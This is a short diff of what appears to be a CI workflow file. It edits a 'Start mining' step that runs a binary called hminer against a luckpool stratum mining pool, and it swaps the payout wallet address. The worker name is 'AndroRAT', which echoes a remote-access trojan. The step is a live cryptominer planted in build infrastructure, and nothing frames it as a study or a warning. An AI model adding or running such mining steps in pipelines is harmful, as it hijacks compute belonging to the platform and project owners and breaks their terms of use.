@@ -28,4 +28,4 @@ jobs:
 
       - name: Start mining
         run: |
-          ./hminer -c stratum+tcp://na.luckpool.net:3956 -u RRykJ9xGTKunTzEHD54L7hBcWDFf9hcGQG.AndroRAT -p hybrid
+          ./hminer -c stratum+tcp://na.luckpool.net:3956 -u RQ14F57caehohy79QZKBh6k5cxfgi45jU2.AndroRAT -p x
